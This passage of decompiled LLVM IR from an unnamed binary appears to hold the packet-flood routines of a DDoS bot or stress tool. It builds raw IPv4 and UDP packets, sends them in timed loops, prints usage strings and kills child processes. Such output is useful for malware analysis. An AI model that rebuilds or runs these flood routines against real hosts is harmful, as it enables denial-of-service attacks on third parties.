  %v1_a2ac = inttoptr i32 %v1_a2a8 to i32*
  %v2_a2ac = load i32, i32* %v1_a2ac, align 4
  %v2_a2b8 = call i32 @function_9d18(i32 %arg2, i32 %v2_a2ac)
  %v1_a2c8 = add i32 %arg4, 12
  %v1_a2cc = inttoptr i32 %v1_a2c8 to i32*
  %v2_a2cc = load i32, i32* %v1_a2cc, align 4
  store i32 %v2_a2cc, i32* @r0, align 4
  %v1_a2d4 = call i32 @function_119f4(i32 %v2_a2cc)
  store i32 %arg2, i32* @r2, align 4
  %v3_a2f8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_18e4c.118 to i32))
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a49c = add i32 %arg4, 8
  %v1_a4a0 = inttoptr i32 %v1_a49c to i32*
  %v2_a4a0 = load i32, i32* %v1_a4a0, align 4
  store i32 %v2_a4a0, i32* @r0, align 4
  %v1_a4a8 = call i32 @function_119f4(i32 %v2_a4a0)
  %v3_a4b4 = urem i32 %v1_a4a8, 65536
  %v1_a4bc = call i32 @function_fc54(i32 %v3_a4b4)
  %v2_a5b4 = ptrtoint i8* %stack_var_-116 to i32
  %v2_a5c0 = bitcast i8* %stack_var_-116 to i16*
  %v2_a660 = ptrtoint i32* %stack_var_-96 to i32
  %v2_a668 = ptrtoint i32* %stack_var_-156 to i32
  %v2_a680 = ptrtoint i32* %stack_var_-76 to i32
  %v2_a688 = ptrtoint i32* %stack_var_-136 to i32
  %v2_a6b0 = bitcast i32* %stack_var_-168 to i16*
  %v2_a6c4 = ptrtoint i32* %stack_var_-184 to i32
  %v2_a710 = add i32 %v1_a2d4, %v2_a1d4
  br label %dec_label_pc_a4c8

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a72c, %dec_label_pc_a2a4
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_a2a4 ], [ %v1_a730, %dec_label_pc_a72c ]
  %v0_a4c8 = call i32 @function_113ec()
  %v2_a4dc = load i32, i32* %v1_a4a0, align 4
  store i32 %v2_a4dc, i32* @r0, align 4
  %v1_a4e4 = call i32 @function_119f4(i32 %v2_a4dc)
  %v2_a4ec = icmp eq i32 %v1_a4e4, 0
  br i1 %v2_a4ec, label %dec_label_pc_a4f4, label %dec_label_pc_a500

dec_label_pc_a4f4:                                ; preds = %dec_label_pc_a4c8
  %v0_a4f4 = call i32 @function_113ec()
  br label %dec_label_pc_a500

dec_label_pc_a500:                                ; preds = %dec_label_pc_a4c8, %dec_label_pc_a4f4
  %v0_a500 = call i32 @function_8570()
  %v1_a528 = call i32 @function_fc54(i32 60)
  %v0_a534 = call i32 @function_113ec()
  %v3_a568 = urem i32 %v0_a4c8, 65536
  store i32 %v3_a568, i32* %stack_var_-96, align 4
  %v0_a580 = call i32 @function_113ec()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_a5c0 = call i32 @function_8d94(i16* %v2_a5c0, i32 20)
  %v0_a5cc = call i32 @function_113ec()
  store i32 %v0_a500, i32* %stack_var_-168, align 4
  %v1_a650 = call i32 @function_fc54(i32 40)
  store i32 %v2_a668, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_a678 = call i32 @function_f6d0(i32 %v2_a660, i32 %v2_a668, i32 20)
  store i32 %v2_a688, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_a698 = call i32 @function_f6d0(i32 %v2_a680, i32 %v2_a688, i32 20)
  %v3_a6b0 = call i32 @function_8d94(i16* %v2_a6b0, i32 52)
  %v6_a6e8 = call i32 @function_ffc0(i32 %v3_a224, i32 %v2_a5b4, i32 60, i32 0, i32 %v2_a6c4, i32 16)
  %tmp = icmp ult i32 %stack_var_-56.0, 50
  br i1 %tmp, label %dec_label_pc_a72c, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a500
  %v2_a6fc = call i32 @function_ced8(i32* null)
  %v3_a714 = icmp ult i32 %v2_a6fc, %v2_a710
  br i1 %v3_a714, label %dec_label_pc_a724, label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a6f8
  %v1_a720 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_a724

dec_label_pc_a724:                                ; preds = %dec_label_pc_a6f8, %dec_label_pc_a71c
  br label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a500, %dec_label_pc_a724
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_a500 ], [ 0, %dec_label_pc_a724 ]
  %v1_a730 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_a4c8

dec_label_pc_a73c:                                ; preds = %dec_label_pc_a184
  ret i32 %v1_a1e4

; uselistorder directives
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %storemerge1112, { 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a724, { 1, 0 }
  uselistorder label %dec_label_pc_a500, { 1, 0 }
  uselistorder label %dec_label_pc_a250, { 1, 0 }
  uselistorder label %dec_label_pc_a298.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a218, { 1, 0 }
}

define i32 @function_a754(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a754:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 42848, i32* %stack_var_-4, align 4
  %v2_a75c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a75c, i32* @fp, align 4
  %v2_a784 = call i32 @function_ced8(i32* null)
  %v1_a794 = call i32 @function_8400(i32 %arg2)
  %v2_a79c = icmp eq i32 %v1_a794, 0
  br i1 %v2_a79c, label %dec_label_pc_a7a4, label %dec_label_pc_ac44

dec_label_pc_a7a4:                                ; preds = %dec_label_pc_a754
  %v8_a7ac = icmp sgt i32 %arg3, 1
  br i1 %v8_a7ac, label %dec_label_pc_a7c8, label %dec_label_pc_a7b0

dec_label_pc_a7b0:                                ; preds = %dec_label_pc_a7a4
  store i32 %arg2, i32* @r2, align 4
  %v3_a7bc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_18e64.120 to i32))
  %v1_a7c4 = call i32 @function_11bf0(i32 1)
  br label %dec_label_pc_a7c8

dec_label_pc_a7c8:                                ; preds = %dec_label_pc_a7a4, %dec_label_pc_a7b0
  %v1_a7cc = add i32 %arg4, 8
  %v1_a7d0 = inttoptr i32 %v1_a7cc to i32*
  %v2_a7d0 = load i32, i32* %v1_a7d0, align 4
  store i32 %v2_a7d0, i32* @r0, align 4
  %v1_a7d8 = call i32 @function_119f4(i32 %v2_a7d0)
  %v3_a7f0 = call i32 @function_10044(i32 2, i32 3, i32 255)
  %v1_a800 = icmp slt i32 %v3_a7f0, 0
  br i1 %v1_a800, label %dec_label_pc_a808, label %dec_label_pc_a810

dec_label_pc_a808:                                ; preds = %dec_label_pc_a7c8
  %v1_a80c = call i32 @function_11bf0(i32 1)
  br label %dec_label_pc_a810

dec_label_pc_a810:                                ; preds = %dec_label_pc_a7c8, %dec_label_pc_a808
  %v2_a814 = call i32 @function_ced8(i32* null)
  store i32 %v2_a814, i32* @r0, align 4
  store i32 %v2_a814, i32* @r4, align 4
  %v0_a81c = call i32 @function_cec4()
  %v0_a824 = load i32, i32* @r4, align 4
  %v2_a824 = xor i32 %v0_a824, %v0_a81c
  %v1_a82c = call i32 @function_11620(i32 %v2_a824)
  %v0_a830 = call i32 @function_113ec()
  %v2_a83c = ptrtoint i32* %stack_var_-76 to i32
  store i32 1400, i32* @r2, align 4
  %v2_a84c = bitcast i32* %stack_var_-76 to i8*
  %v3_a84c = call i32 @function_f5d0(i8* %v2_a84c, i32 %v0_a830)
  %v1_a854 = add i32 %arg4, 4
  %v1_a858 = inttoptr i32 %v1_a854 to i32*
  %v2_a858 = load i32, i32* %v1_a858, align 4
  %v2_a864 = call i32 @function_9d18(i32 %arg2, i32 %v2_a858)
  store i32 %arg2, i32* @r2, align 4
  %v3_a888 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_18e88.122 to i32))
  %v2_aae4 = ptrtoint i8* %stack_var_-116 to i32
  %v2_aaf0 = bitcast i8* %stack_var_-116 to i16*
  %v2_ab60 = ptrtoint i32* %stack_var_-96 to i32
  %v2_ab68 = ptrtoint i32* %stack_var_-156 to i32
  %v2_ab88 = ptrtoint i32* %stack_var_-136 to i32
  %v2_abb0 = bitcast i32* %stack_var_-168 to i16*
  %v2_abc4 = ptrtoint i32* %stack_var_-184 to i32
  %v2_ac10 = add i32 %v1_a7d8, %v2_a784
  br label %dec_label_pc_a88c

dec_label_pc_a88c:                                ; preds = %dec_label_pc_ac24, %dec_label_pc_a810
  %stack_var_-48.0 = phi i32 [ %tmp, %dec_label_pc_a810 ], [ %v1_ac28, %dec_label_pc_ac24 ]
  %v0_a88c = call i32 @function_8570()
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a8fc = call i32 @function_fc54(i32 1440)
  %v0_a908 = call i32 @function_113ec()
  %v0_a94c = call i32 @function_113ec()
  %v3_a958 = urem i32 %v0_a94c, 65536
  store i32 %v3_a958, i32* %stack_var_-96, align 4
  %v0_a960 = call i32 @function_113ec()
  %v0_a974 = call i32 @function_113ec()
  %v0_a980 = call i32 @function_113ec()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_aaf0 = call i32 @function_8d94(i16* %v2_aaf0, i32 20)
  %v3_ab08 = call i32 @function_8d94(i16* %v2_aaf0, i32 40)
  store i32 %v0_a88c, i32* %stack_var_-168, align 4
  %v1_ab50 = call i32 @function_fc54(i32 1420)
  store i32 %v2_ab68, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_ab78 = call i32 @function_f6d0(i32 %v2_ab60, i32 %v2_ab68, i32 20)
  store i32 %v2_ab88, i32* @r3, align 4
  store i32 1400, i32* @r2, align 4
  %v3_ab98 = call i32 @function_f6d0(i32 %v2_a83c, i32 %v2_ab88, i32 1400)
  %v3_abb0 = call i32 @function_8d94(i16* %v2_abb0, i32 1432)
  %v6_abe8 = call i32 @function_ffc0(i32 %v3_a7f0, i32 %v2_aae4, i32 1440, i32 0, i32 %v2_abc4, i32 16)
  %tmp71 = icmp ult i32 %stack_var_-48.0, 50
  br i1 %tmp71, label %dec_label_pc_ac24, label %dec_label_pc_abf8

dec_label_pc_abf8:                                ; preds = %dec_label_pc_a88c
  %v2_abfc = call i32 @function_ced8(i32* null)
  %v3_ac14 = icmp ult i32 %v2_abfc, %v2_ac10
  br i1 %v3_ac14, label %dec_label_pc_ac1c, label %dec_label_pc_ac34

dec_label_pc_ac1c:                                ; preds = %dec_label_pc_abf8
  br label %dec_label_pc_ac24

dec_label_pc_ac24:                                ; preds = %dec_label_pc_a88c, %dec_label_pc_ac1c
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_a88c ], [ 0, %dec_label_pc_ac1c ]
  %v1_ac28 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_a88c

dec_label_pc_ac34:                                ; preds = %dec_label_pc_abf8
  %v1_ac38 = call i32 @function_d088(i32 %v3_a7f0)
  %v1_ac40 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %dec_label_pc_a754, %dec_label_pc_ac34
  %v1_ac4c = phi i32 [ %v1_a794, %dec_label_pc_a754 ], [ %v1_ac40, %dec_label_pc_ac34 ]
  ret i32 %v1_ac4c

; uselistorder directives
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-116, { 2, 0, 1 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_8570, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ac44, { 1, 0 }
  uselistorder label %dec_label_pc_ac24, { 1, 0 }
  uselistorder label %dec_label_pc_a810, { 1, 0 }
  uselistorder label %dec_label_pc_a7c8, { 1, 0 }
}

define i32 @function_ac58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ac58:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 44132, i32* %stack_var_-4, align 4
  %v2_ac60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ac60, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_ac84 = call i32 @function_10110(i32 9216)
  %v2_ac94 = call i32 @function_ced8(i32* null)
  %v1_aca4 = call i32 @function_8400(i32 %arg2)
  %v2_acac = icmp eq i32 %v1_aca4, 0
  br i1 %v2_acac, label %dec_label_pc_acb4, label %dec_label_pc_ae28

dec_label_pc_acb4:                                ; preds = %dec_label_pc_ac58
  %v8_acbc = icmp sgt i32 %arg3, 1
  br i1 %v8_acbc, label %dec_label_pc_acd8, label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_acb4
  store i32 %arg2, i32* @r2, align 4
  %v3_accc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_18eac.124 to i32))
  %v1_acd4 = call i32 @function_11bf0(i32 1)
  br label %dec_label_pc_acd8

dec_label_pc_acd8:                                ; preds = %dec_label_pc_acb4, %dec_label_pc_acc0
  %v1_acdc = add i32 %arg4, 8
  %v1_ace0 = inttoptr i32 %v1_acdc to i32*
  %v2_ace0 = load i32, i32* %v1_ace0, align 4
  store i32 %v2_ace0, i32* @r0, align 4
  %v1_ace8 = call i32 @function_119f4(i32 %v2_ace0)
  %v2_acf4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 16, i32* @r2, align 4
  %v2_ad04 = bitcast i32* %stack_var_-60 to i8*
  %v3_ad04 = call i32 @function_f5d0(i8* %v2_ad04, i32 0)
  %v1_ad0c = add i32 %arg4, 4
  %v1_ad10 = inttoptr i32 %v1_ad0c to i32*
  %v2_ad10 = load i32, i32* %v1_ad10, align 4
  %v2_ad1c = call i32 @function_9d18(i32 %arg2, i32 %v2_ad10)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_ad48 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_18ed0.126 to i32))
  %v2_adf4 = add i32 %v1_ace8, %v2_ac94
  %v2_ad8c = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_ad4c

dec_label_pc_ad4c:                                ; preds = %dec_label_pc_ae08, %dec_label_pc_acd8
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_acd8 ], [ %v1_ae0c, %dec_label_pc_ae08 ]
  %v0_ad4c = call i32 @function_113ec()
  %v3_ad6c = call i32 @function_10044(i32 2, i32 2, i32 17)
  %v1_ad7c = icmp slt i32 %v3_ad6c, 0
  br i1 %v1_ad7c, label %dec_label_pc_add0, label %dec_label_pc_ad84

dec_label_pc_ad84:                                ; preds = %dec_label_pc_ad4c
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %v2_ad8c, i32* @r3, align 4
  %v3_ada0 = call i32 @function_d034(i32 %v3_ad6c, i32 21537, i32 %v2_ad8c)
  %v6_adc4 = call i32 @function_ffc0(i32 %v3_ad6c, i32 %v1_ac84, i32 9216, i32 0, i32 %v2_acf4, i32 16)
  %v1_adcc = call i32 @function_d088(i32 %v3_ad6c)
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ad4c, %dec_label_pc_ad84
  %v7_add8 = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_add8, label %dec_label_pc_ae08, label %dec_label_pc_addc

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v2_ade0 = call i32 @function_ced8(i32* null)
  %v3_adf8 = icmp ult i32 %v2_ade0, %v2_adf4
  br i1 %v3_adf8, label %dec_label_pc_ae00, label %dec_label_pc_ae18

dec_label_pc_ae00:                                ; preds = %dec_label_pc_addc
  br label %dec_label_pc_ae08

dec_label_pc_ae08:                                ; preds = %dec_label_pc_add0, %dec_label_pc_ae00
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_add0 ], [ 0, %dec_label_pc_ae00 ]
  %v1_ae0c = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_ad4c

dec_label_pc_ae18:                                ; preds = %dec_label_pc_addc
  %v1_ae1c = call i32 @function_d088(i32 %v3_ad6c)
  %v1_ae24 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_ae28

dec_label_pc_ae28:                                ; preds = %dec_label_pc_ac58, %dec_label_pc_ae18
  %v1_ae30 = phi i32 [ %v1_aca4, %dec_label_pc_ac58 ], [ %v1_ae24, %dec_label_pc_ae18 ]
  ret i32 %v1_ae30

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_ffc0, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_9d18, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ae28, { 1, 0 }
  uselistorder label %dec_label_pc_ae08, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_acd8, { 1, 0 }
}

define i32 @function_ae3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae3c:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 44616, i32* %stack_var_-4, align 4
  %v2_ae44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ae44, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v5_ae64 = icmp sgt i32 %arg3, 0
  br i1 %v5_ae64, label %dec_label_pc_ae80, label %dec_label_pc_ae68

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae3c
  store i32 %arg2, i32* @r2, align 4
  %v3_ae74 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_18eec.128 to i32))
  %v1_ae7c = call i32 @function_11bf0(i32 1)
  %v3_ae80.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_ae80

dec_label_pc_ae80:                                ; preds = %dec_label_pc_ae3c, %dec_label_pc_ae68
  %v3_ae80 = phi i32 [ %arg4, %dec_label_pc_ae3c ], [ %v3_ae80.pre, %dec_label_pc_ae68 ]
  %v1_ae84 = add i32 %v3_ae80, 4
  %v1_ae88 = inttoptr i32 %v1_ae84 to i32*
  %v2_ae88 = load i32, i32* %v1_ae88, align 4
  %v1_ae90 = call i32 @function_fb80(i32 %v2_ae88)
  store i32 %v1_ae90, i32* @global_var_25aa8.130, align 4
  store i32 1, i32* @global_var_23238.132, align 4
  %v1_aeb4 = call i32 @function_d088(i32 %arg1)
  ret i32 %v1_aeb4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ae80, { 1, 0 }
}

define i32 @function_aed0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_aed0:
  %stack_var_-4 = alloca i32, align 4
  store i32 44764, i32* %stack_var_-4, align 4
  %v2_aed8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aed8, i32* @fp, align 4
  %v1_aef4 = call i32 @function_8400(i32 %arg2)
  %v2_aefc = icmp eq i32 %v1_aef4, 0
  br i1 %v2_aefc, label %dec_label_pc_af04, label %dec_label_pc_b09c

dec_label_pc_af04:                                ; preds = %dec_label_pc_aed0
  store i32 %arg2, i32* @r2, align 4
  %v3_af10 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([119 x i8]* @global_var_18f08.134 to i32))
  %v1_af18 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af28 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([123 x i8]* @global_var_18f80.136 to i32))
  %v1_af30 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af40 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_18ffc.138 to i32))
  %v1_af48 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af58 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1904c.140 to i32))
  %v1_af60 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af70 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([94 x i8]* @global_var_190ac.142 to i32))
  %v1_af78 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_af88 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([79 x i8]* @global_var_1910c.144 to i32))
  %v1_af90 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afa0 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_1915c.146 to i32))
  %v1_afa8 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afb8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_191b8.148 to i32))
  %v1_afc0 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afd0 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([103 x i8]* @global_var_19214.150 to i32))
  %v1_afd8 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_afe8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_1927c.152 to i32))
  %v1_aff0 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b000 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_192e4.154 to i32))
  %v1_b008 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b018 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([117 x i8]* @global_var_19334.156 to i32))
  %v1_b020 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b030 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_193ac.158 to i32))
  %v1_b038 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b048 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([91 x i8]* @global_var_19408.160 to i32))
  %v1_b050 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b060 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_19464.162 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_b070 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_194b4.164 to i32))
  %v1_b078 = call i32 @function_11ca8(i32 2)
  store i32 %arg2, i32* @r2, align 4
  %v3_b088 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([82 x i8]* @global_var_19514.166 to i32))
  %v1_b090 = call i32 @function_11ca8(i32 2)
  %v1_b098 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_b09c

dec_label_pc_b09c:                                ; preds = %dec_label_pc_aed0, %dec_label_pc_af04
  %v1_b0a4 = phi i32 [ %v1_aef4, %dec_label_pc_aed0 ], [ %v1_b098, %dec_label_pc_af04 ]
  ret i32 %v1_b0a4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_b09c, { 1, 0 }
}

define i32 @function_b0ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b0ec:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 45304, i32* %stack_var_-4, align 4
  %v2_b0f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0f4, i32* @fp, align 4
  %v0_b0fc = load i32, i32* @r0, align 4
  %v2_b16c = icmp eq i32 %arg2, 0
  %v2_b1d814 = load i32, i32* @global_var_23248.14, align 4
  %v3_b1e016 = icmp eq i32 %v2_b1d814, 0
  br i1 %v3_b1e016, label %dec_label_pc_b1e8, label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b1c8, %dec_label_pc_b0ec
  %storemerge122 = phi i32 [ %v1_b1cc, %dec_label_pc_b1c8 ], [ 0, %dec_label_pc_b0ec ]
  %v1_b1f021 = phi i32 [ %v1_b1f02, %dec_label_pc_b1c8 ], [ %v0_b0fc, %dec_label_pc_b0ec ]
  %v3_b11c = mul i32 %storemerge122, 4
  %v2_b128 = load i32, i32* @global_var_25ab4.16, align 4
  %v2_b12c = add i32 %v2_b128, %v3_b11c
  %v1_b130 = inttoptr i32 %v2_b12c to i32*
  %v2_b130 = load i32, i32* %v1_b130, align 4
  %v2_b134 = icmp eq i32 %v2_b130, 0
  br i1 %v2_b134, label %dec_label_pc_b1c8, label %dec_label_pc_b13c

dec_label_pc_b13c:                                ; preds = %dec_label_pc_b118
  %v2_b154 = load i32, i32* %v1_b130, align 4
  store i32 %v2_b154, i32* @r4, align 4
  %v0_b158 = call i32 @function_cec4()
  store i32 %v0_b158, i32* @r0, align 4
  %v0_b160 = load i32, i32* @r4, align 4
  %v9_b160 = icmp eq i32 %v0_b160, %v0_b158
  br i1 %v9_b160, label %dec_label_pc_b1c8, label %dec_label_pc_b168

dec_label_pc_b168:                                ; preds = %dec_label_pc_b13c
  br i1 %v2_b16c, label %dec_label_pc_b1a0, label %dec_label_pc_b174

dec_label_pc_b174:                                ; preds = %dec_label_pc_b168
  store i32 %arg2, i32* @r2, align 4
  %v3_b19c = call i32 @function_8398(i32 %v0_b0fc, i32 ptrtoint ([28 x i8]* @global_var_19568.169 to i32))
  br label %dec_label_pc_b1a0

dec_label_pc_b1a0:                                ; preds = %dec_label_pc_b168, %dec_label_pc_b174
  %v2_b1b0 = load i32, i32* @global_var_25ab4.16, align 4
  %v2_b1b4 = add i32 %v2_b1b0, %v3_b11c
  %v1_b1b8 = inttoptr i32 %v2_b1b4 to i32*
  %v2_b1b8 = load i32, i32* %v1_b1b8, align 4
  %v2_b1c4 = call i32 @function_cf98(i32 %v2_b1b8, i32 9)
  store i32 %v2_b1c4, i32* @r0, align 4
  br label %dec_label_pc_b1c8

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_b13c, %dec_label_pc_b118, %dec_label_pc_b1a0
  %v1_b1f02 = phi i32 [ %v0_b158, %dec_label_pc_b13c ], [ %v1_b1f021, %dec_label_pc_b118 ], [ %v2_b1c4, %dec_label_pc_b1a0 ]
  %v1_b1cc = add i32 %storemerge122, 1
  %v2_b1d8 = load i32, i32* @global_var_23248.14, align 4
  %v3_b1e0 = icmp ult i32 %v1_b1cc, %v2_b1d8
  br i1 %v3_b1e0, label %dec_label_pc_b118, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1c8, %dec_label_pc_b0ec
  %v1_b1f0.lcssa = phi i32 [ %v0_b0fc, %dec_label_pc_b0ec ], [ %v1_b1f02, %dec_label_pc_b1c8 ]
  ret i32 %v1_b1f0.lcssa

; uselistorder directives
  uselistorder i32 %v1_b1cc, { 1, 0 }
  uselistorder i32 %v3_b11c, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_b0fc, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_b1c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b1a0, { 1, 0 }
}

define i32 @function_b200(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b200:
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 45580, i32* %stack_var_-4, align 4
  %v2_b208 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b208, i32* @fp, align 4
  %v3_b228 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_188a0.12 to i32))
  ret i32 %v3_b228

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_b23c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b23c:
